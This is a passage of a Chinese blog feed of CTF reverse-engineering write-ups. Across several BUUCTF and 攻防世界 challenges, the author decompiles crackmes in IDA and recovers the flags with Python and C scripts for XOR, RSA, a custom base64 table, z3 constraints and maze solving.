    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s[i])^a[i])
<span class="hljs-built_in">print</span>(flag)</code></pre>
<p>运行结果为~!3a@0<br>输入两部分密码后在文件夹生成了一个RTF文件，打开即开找到flag<br><img src="https://img-blog.csdnimg.cn/c40ef2721efd45d482093895fee79859.png" alt="在这里插入图片描述"><br>总结：这道题含有大量看不懂的计算加密函数，需要大量资料</p>
<blockquote>
<p>HRSRC FindResourceA(<br>  HMODULE hModule,<br>  LPCSTR  lpName,<br>  LPCSTR  lpType<br>);<br>FindResourceA function<br>Determines the location of a resource with the specified type and name in the specified module.<br>确定具有指定类型和名称的资源在指定模块中的位置。<br>hModule：处理包含资源的可执行文件的模块。NULL值则指定模块句柄指向操作系统通常情况下创建最近过程的相关位图文件。<br>lpName：指定资源名称。<br>lpType：指定资源类型。<br>返回值：如果函数运行成功，那么返回值为指向被指定资源信息块的句柄。为了获得这些资源，将这个句柄传递给LoadResource函数。如果函数运行失败，则返回值为NULL。</p>
</blockquote>
<blockquote>
<p>SizeofResource表示该函数返回指定资源的字节数大小。</p>
</blockquote>
<blockquote>
<p>LoadResource function<br>检索一个句柄，该句柄可用于获取指向内存中指定资源的第一个字节的指针。</p>
</blockquote>
<p>这三个函数，一个找句柄，一个通过句柄找指针，一个范围查找的资源的大小</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
  </entry>
  <entry>
    <title>刷题记录reverse9</title>
    <url>/2023/11/13/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95reverse9/</url>
    <content><![CDATA[<p>BUUCTF REVERSE</p>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><p>下载附件，拖入XEXE，发现有壳<br><img src="https://img-blog.csdnimg.cn/1c7cfad24a004f429250b018e8769444.png" alt="在这里插入图片描述"><br>用kali脱壳后拖入64位IDA，找到关键函数<br><img src="https://img-blog.csdnimg.cn/68fd2830952649969f8a54baba0faaf1.png" alt="在这里插入图片描述"><br>跟进sub_4009AE<br>脚本：</p>
<pre><code class="hljs python">flag=<span class="hljs-string">&#x27;&#x27;</span>
flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-number">166163712</span>//<span class="hljs-number">1629056</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">731332800</span> // <span class="hljs-number">6771600</span>)
flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">357245568</span> // <span class="hljs-number">3682944</span>)
flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">1074393000</span> // <span class="hljs-number">10431000</span>)
flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">489211344</span> // <span class="hljs-number">3977328</span>)
flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">518971936</span> // <span class="hljs-number">5138336</span>)
flag+=<span class="hljs-string">&#x27;?&#x27;</span>
flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">406741500</span> // <span class="hljs-number">7532250</span>)
flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">294236496</span> // <span class="hljs-number">5551632</span>)
flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">177305856</span> // <span class="hljs-number">3409728</span>)
flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">650683500</span> // <span class="hljs-number">13013670</span>)
flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">298351053</span> // <span class="hljs-number">6088797</span>)
flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">386348487</span> // <span class="hljs-number">7884663</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">438258597</span> // <span class="hljs-number">8944053</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">249527520</span> // <span class="hljs-number">5198490</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">445362764</span> // <span class="hljs-number">4544518</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">981182160</span> // <span class="hljs-number">10115280</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">174988800</span> // <span class="hljs-number">3645600</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">493042704</span> // <span class="hljs-number">9667504</span>)
flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">257493600</span> // <span class="hljs-number">5364450</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">767478780</span> // <span class="hljs-number">13464540</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">312840624</span> // <span class="hljs-number">5488432</span>)
flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">1404511500</span> // <span class="hljs-number">14479500</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">316139670</span> // <span class="hljs-number">6451830</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">619005024</span> // <span class="hljs-number">6252576</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">372641472</span> // <span class="hljs-number">7763364</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">373693320</span> // <span class="hljs-number">7327320</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">498266640</span> // <span class="hljs-number">8741520</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">452465676</span> // <span class="hljs-number">8871876</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">208422720</span> // <span class="hljs-number">4086720</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">515592000</span> // <span class="hljs-number">9374400</span>)
flag+= <span class="hljs-built_in">chr</span>(<span class="hljs-number">719890500</span> // <span class="hljs-number">5759124</span>)
<span class="hljs-built_in">print</span>(flag)
 
<span class="hljs-comment">#flag&#123;e?65421110ba03099a1c039337&#125;</span></code></pre>
<p>差一位，穷举得出<br>别人用z3处理器的脚本</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *
s = Solver()
a1 = [<span class="hljs-number">0</span>]*<span class="hljs-number">32</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):
    a1[i] = Int(<span class="hljs-string">&#x27;a1[&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;]&#x27;</span>)

s.add( <span class="hljs-number">1629056</span> * a1[<span class="hljs-number">0</span>] == <span class="hljs-number">166163712</span> )
s.add( <span class="hljs-number">6771600</span> * a1[<span class="hljs-number">1</span>] == <span class="hljs-number">731332800</span> )
s.add( <span class="hljs-number">3682944</span> * a1[<span class="hljs-number">2</span>] == <span class="hljs-number">357245568</span> )
s.add( <span class="hljs-number">10431000</span> * a1[<span class="hljs-number">3</span>] == <span class="hljs-number">1074393000</span> )
s.add( <span class="hljs-number">3977328</span> * a1[<span class="hljs-number">4</span>] == <span class="hljs-number">489211344</span> )
s.add( <span class="hljs-number">5138336</span> * a1[<span class="hljs-number">5</span>] == <span class="hljs-number">518971936</span> )
s.add( <span class="hljs-number">7532250</span> * a1[<span class="hljs-number">7</span>] == <span class="hljs-number">406741500</span> )
s.add( <span class="hljs-number">5551632</span> * a1[<span class="hljs-number">8</span>] == <span class="hljs-number">294236496</span> )
s.add( <span class="hljs-number">3409728</span> * a1[<span class="hljs-number">9</span>] == <span class="hljs-number">177305856</span> )
s.add( <span class="hljs-number">13013670</span> * a1[<span class="hljs-number">10</span>] == <span class="hljs-number">650683500</span> )
s.add( <span class="hljs-number">6088797</span> * a1[<span class="hljs-number">11</span>] == <span class="hljs-number">298351053</span> )
s.add( <span class="hljs-number">7884663</span> * a1[<span class="hljs-number">12</span>] == <span class="hljs-number">386348487</span> )
s.add( <span class="hljs-number">8944053</span> * a1[<span class="hljs-number">13</span>] == <span class="hljs-number">438258597</span> )
s.add( <span class="hljs-number">5198490</span> * a1[<span class="hljs-number">14</span>] == <span class="hljs-number">249527520</span> )
s.add( <span class="hljs-number">4544518</span> * a1[<span class="hljs-number">15</span>] == <span class="hljs-number">445362764</span> )
s.add( <span class="hljs-number">3645600</span> * a1[<span class="hljs-number">17</span>] == <span class="hljs-number">174988800</span> )
s.add( <span class="hljs-number">10115280</span> * a1[<span class="hljs-number">16</span>] == <span class="hljs-number">981182160</span> )
s.add( <span class="hljs-number">9667504</span> * a1[<span class="hljs-number">18</span>] == <span class="hljs-number">493042704</span> )
s.add( <span class="hljs-number">5364450</span> * a1[<span class="hljs-number">19</span>] == <span class="hljs-number">257493600</span> )
s.add( <span class="hljs-number">13464540</span> * a1[<span class="hljs-number">20</span>] == <span class="hljs-number">767478780</span> )
s.add( <span class="hljs-number">5488432</span> * a1[<span class="hljs-number">21</span>] == <span class="hljs-number">312840624</span> )
s.add( <span class="hljs-number">14479500</span> * a1[<span class="hljs-number">22</span>] == <span class="hljs-number">1404511500</span> )
s.add( <span class="hljs-number">6451830</span> * a1[<span class="hljs-number">23</span>] == <span class="hljs-number">316139670</span> )
s.add( <span class="hljs-number">6252576</span> * a1[<span class="hljs-number">24</span>] == <span class="hljs-number">619005024</span> )
s.add( <span class="hljs-number">7763364</span> * a1[<span class="hljs-number">25</span>] == <span class="hljs-number">372641472</span> )
s.add( <span class="hljs-number">7327320</span> * a1[<span class="hljs-number">26</span>] == <span class="hljs-number">373693320</span> )
s.add( <span class="hljs-number">8741520</span> * a1[<span class="hljs-number">27</span>] == <span class="hljs-number">498266640</span> )
s.add( <span class="hljs-number">8871876</span> * a1[<span class="hljs-number">28</span>] == <span class="hljs-number">452465676</span> )
s.add( <span class="hljs-number">4086720</span> * a1[<span class="hljs-number">29</span>] == <span class="hljs-number">208422720</span> )
s.add( <span class="hljs-number">9374400</span> * a1[<span class="hljs-number">30</span>] == <span class="hljs-number">515592000</span> )
s.add(<span class="hljs-number">5759124</span> * a1[<span class="hljs-number">31</span>] == <span class="hljs-number">719890500</span>)
s.check()
<span class="hljs-built_in">print</span>(s.model())
</code></pre>
<h1 id="Transform"><a href="#Transform" class="headerlink" title="Transform"></a>Transform</h1><p>拖入64位IDA，F5反编译<br><img src="https://img-blog.csdnimg.cn/c6e1cbdb8b914a85b9891cc1386af60b.png" alt="在这里插入图片描述"><br>跟进dword_40F040，快捷字符转换<br><img src="https://img-blog.csdnimg.cn/88788536bdc04b84bf7ebd2e0622b260.png" alt="在这里插入图片描述"><br>脚本：</p>
<pre><code class="hljs python">a1 = [<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">23</span>,<span class="hljs-number">7</span>,<span class="hljs-number">24</span>,<span class="hljs-number">12</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">16</span>,<span class="hljs-number">3</span>,<span class="hljs-number">17</span>,<span class="hljs-number">32</span>,<span class="hljs-number">29</span>,<span class="hljs-number">11</span>,<span class="hljs-number">30</span>,<span class="hljs-number">27</span>,<span class="hljs-number">22</span>,<span class="hljs-number">4</span>,<span class="hljs-number">13</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">2</span>,<span class="hljs-number">25</span>,<span class="hljs-number">5</span>,<span class="hljs-number">31</span>,<span class="hljs-number">8</span>,<span class="hljs-number">18</span>,<span class="hljs-number">26</span>,<span class="hljs-number">28</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>]
a2 = [<span class="hljs-number">0x67</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x7B</span>,<span class="hljs-number">0x7F</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x2B</span>,<span class="hljs-number">0x3C</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x5E</span>,<span class="hljs-number">0x5D</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x7B</span>,<span class="hljs-number">0x2D</span>,<span class="hljs-number">0x2A</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x6B</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x3C</span>,<span class="hljs-number">0x5C</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x6F</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x4D</span>]
flag = [<span class="hljs-number">0</span>]*<span class="hljs-number">33</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a2)):
    a2[i]^=a1[i]
    flag[a1[i]]=a2[i]
<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):
    flag[j]=<span class="hljs-built_in">chr</span>(flag[j])
Mc=<span class="hljs-string">&quot;&quot;</span>.join(flag)
<span class="hljs-built_in">print</span>(Mc)</code></pre>
<p>运行得到flag</p>
<h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>简单脱壳题</p>
<h1 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h1><p>拖入64位IDA，F5反编译，找到main函数<br>程序调用了 __gmpz_init_set_str 函数，通过搜索得知这是一个 GNU 高精度算法库<br>有三段字符串，查找知道其中65537在RSA其中常见<br><img src="https://img-blog.csdnimg.cn/d5e6f103d2f04cc49c5e083e02d57391.png" alt="在这里插入图片描述"><br>c=ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35<br>n=103461035900816914121390101299049044413950405173712170434161686539878160984549<br>e=65537<br>分解n，得到<br>p=366669102002966856876605669837014229419<br>q=282164587459512124844245113950593348271<br>RSA解密脚本：</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2
<span class="hljs-keyword">import</span> binascii

p = <span class="hljs-number">282164587459512124844245113950593348271</span>
q = <span class="hljs-number">366669102002966856876605669837014229419</span>
c = <span class="hljs-number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span>
n = <span class="hljs-number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span>
e = <span class="hljs-number">65537</span>
phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)
d = gmpy2.invert(gmpy2.mpz(e), phi_n)
flag = gmpy2.powmod(c, d, n)
<span class="hljs-built_in">print</span>(binascii.unhexlify(<span class="hljs-built_in">hex</span>(flag)[<span class="hljs-number">2</span>:]))</code></pre>
<p>运行得到flag</p>
<h1 id="usualCrypt"><a href="#usualCrypt" class="headerlink" title="usualCrypt"></a>usualCrypt</h1><p>拖入32位IDA，反编译<br>sub_401080是加密函数，跟进看看<br>主体代码是base64加密，但在加密前执行了sub_401000()<br><img src="https://img-blog.csdnimg.cn/02043dd22493492789134ed2a1a0d68f.png" alt="在这里插入图片描述"><br>byte_40E0AA,byte_40E0A0，快捷键R转换字符型，调用table<br><img src="https://img-blog.csdnimg.cn/56a0860f3a2b4636aa99c3a759b04680.png#pic_center" alt="在这里插入图片描述"><br>加密后，该函数又调用了sub_401030<br>这个子函数把字符串每个英文字符进行了大小写转换，最后形成数据段保存的密码byte_40E0E4<img src="https://img-blog.csdnimg.cn/2608c5e175a74126bc90bb958b135733.png" alt="在这里插入图片描述"><br>这个子函数把字符串每个英文字符进行了大小写转换，最后形成数据段保存的密码byte_40E0E4<br>脚本：</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> base64

flag = <span class="hljs-string">&#x27;&#x27;</span>; <span class="hljs-built_in">dict</span> = &#123;&#125;; offset = <span class="hljs-number">10</span>
orgin = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(orgin)):
    <span class="hljs-built_in">dict</span>[orgin[i]] = orgin[i]
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>, <span class="hljs-number">15</span>): <span class="hljs-comment">#sub_401000()</span>
    <span class="hljs-built_in">dict</span>[orgin[i]] , <span class="hljs-built_in">dict</span>[orgin[i+offset]] = <span class="hljs-built_in">dict</span>[orgin[i+offset]] , <span class="hljs-built_in">dict</span>[orgin[i]] <span class="hljs-comment"># 恢复base64密钥表</span>
secret = <span class="hljs-string">&#x27;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&#x27;</span>.swapcase() <span class="hljs-comment">#sub_401030()</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(secret)):
    flag += <span class="hljs-built_in">dict</span>[secret[i]] 
flag = base64.b64decode(flag)
<span class="hljs-built_in">print</span>(flag)</code></pre>
<h1 id="Maze"><a href="#Maze" class="headerlink" title="Maze"></a>Maze</h1><p>这道题考察的就是花指令和封装函数<br>首先附件下载后拖入exe查壳，有壳，用kali脱壳拖入32位IDA，发现不能F5反编译<br>看汇编，jnz跳转到下一条指令，相当于没跳转，nop掉。下面call了一个错误地址，按d转为数据，nop掉第一个字节（改成90）。<br>此时仍然无法反编译<br>选中所有核心代码，p键封装函数，F5反汇编看到迷宫判断条件<br><img src="https://img-blog.csdnimg.cn/d6b08505b8f44eb9b6f265063a9ac0e2.png" alt="在这里插入图片描述"></p>
<pre><code class="hljs bash">*******+**
*******s**
****aaas**
**aas*****
**s**F****
**sddd****
**********</code></pre>

]]></content>
      <categories>
        <category>刷题</category>
      </categories>
  </entry>
  <entry>
    <title>寒假刷题记录reverse1</title>
    <url>/2023/02/23/%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951reverse/</url>
    <content><![CDATA[<p>攻防世界</p>
<h2 id="1-Reversing-x64Elf-100"><a href="#1-Reversing-x64Elf-100" class="headerlink" title="1.Reversing-x64Elf-100"></a>1.Reversing-x64Elf-100</h2><p>拖入EXE中查看信息<br><img src="https://img-blog.csdnimg.cn/e500a6b46f614f71904da1d6fae2cc7a.png" alt="在这里插入图片描述"></p>
<p>拖入64位IDA<br><img src="https://img-blog.csdnimg.cn/f2753ea6b0024398b05baa580d0986aa.png" alt="在这里插入图片描述"></p>
<p>双击进入main函数，F5查看伪代码<br><img src="https://img-blog.csdnimg.cn/a24506c0d7b848b88f18dc00d28cd150.png" alt="在这里插入图片描述"></p>
<p>双击跟进sub_400FD<br><img src="https://img-blog.csdnimg.cn/06853083e5c84a7f965b9eed4c89249a.png" alt="在这里插入图片描述"></p>
<p>编写脚本<br><img src="https://img-blog.csdnimg.cn/4db3912b39664755ab6523df7830e63f.png" alt="在这里插入图片描述"></p>
<p>得到flag为Code_Talkers</p>
<h2 id="2-666"><a href="#2-666" class="headerlink" title="2.666"></a>2.666</h2><p>下载附件并解压，解压后文件拖入exe<br><img src="https://img-blog.csdnimg.cn/78eff035106449c08509a9ec0afd732e.png" alt="在这里插入图片描述"></p>
<p>拖入64位IDA<br>找到主函数，F5<br><img src="https://img-blog.csdnimg.cn/adeb4d30c8fe4faea67ddda1339e5cee.png" alt="在这里插入图片描述"></p>
<p>v5是需要输入的内容，v5的长度等于key，用s和enflag进行比较，相等就输出You are Right .<br>观察encode函数<br><img src="https://img-blog.csdnimg.cn/416a4ba648654bc4af9437dff2f220de.png" alt="在这里插入图片描述"></p>
<p>a1即为主函数中的v5，a2即为主函数中的s,对a1进行处理可以得到a2，根据循环可写逆过程<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;</p>
<p>int main()<br>{<br>    char a1[20],a2[20]={“izwhroz&quot;&quot;w&quot;v.K&quot;.Ni”},v3[32],v4[32],v5[40];<br>    int v6,i;<br>    i=0;<br>    v6=0;<br>    for(i=15;i&gt;=0;i-=3)<br>    {<br>        v3[i+2]=a2[i+2];<br>        v4[i+1]=a2[i+1];<br>        v5[i]=a2[i];<br>        a1[i+2]=v3[i+2]^18^6;<br>        a1[i+1]=(v4[i+1]^18)+6;<br>        a1[i]=(18^v5[i])-6;<br>    }<br>    a1[18]=’\0’;<br>    printf(“%s”,a1);<br>    return 0;<br>}<br>运行得到flag为unctf{b66_6b6_66b}</p>
<h2 id="3-easyRE1"><a href="#3-easyRE1" class="headerlink" title="3.easyRE1"></a>3.easyRE1</h2><p>解压文件后得到两个文件分别拖入32位和64位IDA，F5后发现主函数相同且直接得到flag<br><img src="https://img-blog.csdnimg.cn/f650c88fd4434965a7548638888bb262.png" alt="在这里插入图片描述"></p>
<p>flag为flag{db2f62a36a018bce28e46d976e3f9864}</p>
<h2 id="4-Lucknum"><a href="#4-Lucknum" class="headerlink" title="4.Lucknum"></a>4.Lucknum</h2><p>下载附件并解压，拖入exe<br><img src="https://img-blog.csdnimg.cn/962138de56504079ac1aaf48a4a248c1.png" alt="在这里插入图片描述"></p>
<p>拖入64位IDA，F5后直接可找到flag<br><img src="https://img-blog.csdnimg.cn/41ccd0ec108b4ae9903a47fde8d9b37d.png" alt="在这里插入图片描述"></p>
<p>flag为flag{c0ngr@tul@ti0n_f0r_luck_numb3r}</p>
<h2 id="5-reverse-re3"><a href="#5-reverse-re3" class="headerlink" title="5.reverse_re3"></a>5.reverse_re3</h2><p>下载附件并解压，拖入exe<br><img src="https://img-blog.csdnimg.cn/23afb6502cd148aea4538eb12b1ebc23.png" alt="在这里插入图片描述"></p>
<p>拖入64位IDA<br>找到main函数，F5后双击跟进v4=sub_940()<br>快捷键R转化为字符发现分别出现wasd，猜测为迷宫游戏<br>v5 = __readfsqword(0x28u);<br>  v3 = 0;<br>  memset(v4, 0, 0x200uLL);<br>  _isoc99_scanf(&amp;unk_1278, v4, v4);<br>  while ( 1 )<br>  {<br>    do<br>    {<br>      v2 = 0;<br>      sub_86C();<br>      v0 = v4[v3];<br>      if ( v0 == ‘d’ )<br>      {<br>        v2 = sub_E23();<br>      }<br>      else if ( v0 &gt; ‘d’ )<br>      {<br>        if ( v0 == ‘s’ )<br>        {<br>          v2 = sub_C5A();<br>        }<br>        else if ( v0 == ‘w’ )<br>        {<br>          v2 = sub_A92();<br>        }<br>      }<br>      else<br>      {<br>        if ( v0 == 27 )<br>          return 0xFFFFFFFFLL;<br>        if ( v0 == ‘a’ )<br>          v2 = sub_FEC();<br>      }<br>      ++v3;<br>    }<br>    while ( v2 != 1 );<br>    if ( dword_202AB0 == 2 )<br>      break;<br>    ++dword_202AB0;<br>  }<br>  puts(“success! the flag is flag{md5(your input)}”);<br>  return 1LL;<br>}<br>分别进入函数体内<br>双击Sub_E23<br>双击dword202020<br><img src="https://img-blog.csdnimg.cn/80042cf20a324edbb2897ddda0095c3c.png" alt="在这里插入图片描述"></p>
<p>提取数据，shift+e<br>因为数组是dword类型 所以应该四个为一组 只有第一个为有效值，后面的都是补0<br><img src="https://img-blog.csdnimg.cn/f3f5d562872541ed9f06f23252d991d7.png" alt="在这里插入图片描述"></p>
<p>这时候可以在Export as下选择倒数第二个选项 initialized C variable<br>提取出来的补0就没有了<br>一个迷宫应该是15x15 =225<br>根据提取出的数组大小675 可以知道<br>675=225*3三个迷宫<br>处理后，得到如下迷宫<br>第一个迷宫<br>[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]<br>[1, 1, 1, 1, 1, 0, 3, 1, 1, 0, 0, 0, 0, 0, 0]<br>[1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]<br>[1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]<br>[1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0]<br>[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]<br>[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]<br>[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0]<br>[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0]<br>[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0]<br>[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]<br>[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]<br>[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]<br>[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]<br>[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]<br>第二个迷宫<br>[1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]<br>[1, 1, 0, 3, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0]<br>[1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]<br>[1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]<br>[1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0]<br>[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]<br>[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]<br>[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0]<br>[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0]<br>[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0]<br>[1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0]<br>[1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0]<br>[1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0]<br>[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]<br>[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]<br>第三个迷宫<br>[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]<br>[0, 3, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]<br>[0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0]<br>[0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0]<br>[0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]<br>[0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]<br>[0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]<br>[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]<br>[0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0]<br>[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0]<br>[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0]<br>[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0]<br>[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0]<br>[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0]<br>[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0]<br>“3”是起点，“4”是终点，“1”是可走的，“0”是不可走的<br> 最后将三个迷宫的解法，并在一起<br>ddsssddddsssdssdddddsssddddsssaassssdddsddssddwddssssssdddssssdddss<br>Md5解密MD5在线加密/解密/破解—MD5在线 (sojson.com)<br>得到flag{aeea66fcac7fa80ed8f79f38ad5bb953}</p>
<h2 id="6-1000Click"><a href="#6-1000Click" class="headerlink" title="6.1000Click"></a>6.1000Click</h2><p>拖入exe查壳，无壳<br>拖入32位IDA，shift+F12查看字符串，ctrl+f全局搜索flag<br><img src="https://img-blog.csdnimg.cn/7d2e91c3892d45769d3531c2a43eacc6.png" alt="在这里插入图片描述"></p>
<p>找到flag为flag{TIBntXVbdZ4Z9VRtoOQ2wR1vDNIjQ8Ra}</p>
<h2 id="7-crypt"><a href="#7-crypt" class="headerlink" title="7.crypt"></a>7.crypt</h2><p>拖入exe<br><img src="https://img-blog.csdnimg.cn/ae831b2b878c462bba7b5227f47e3749.png" alt="在这里插入图片描述"></p>
<p>拖入64位IDA<br>(5条消息) 攻防世界：crypt(RC4)_逆向技术分享的博客-CSDN博客</p>
<h2 id="8-happyctf"><a href="#8-happyctf" class="headerlink" title="8.happyctf"></a>8.happyctf</h2><p>拖入32位IDA，F5<br>int __thiscall sub_403B70(void *this, char a2)<br>{<br>  char v3[65]; // [esp+Fh] [ebp-45h] BYREF<br>  void *v4; // [esp+50h] [ebp-4h]</p>
<p>  v4 = this;<br>  v3[0] = a2 ^ 0x14;//进行异或<br>  sub_406170(v3);<br>  return ++dword_4DD8F8;<br>}<br><img src="https://img-blog.csdnimg.cn/fb296bf4343342f5981cd3cf8e203417.png" alt="在这里插入图片描述"></p>
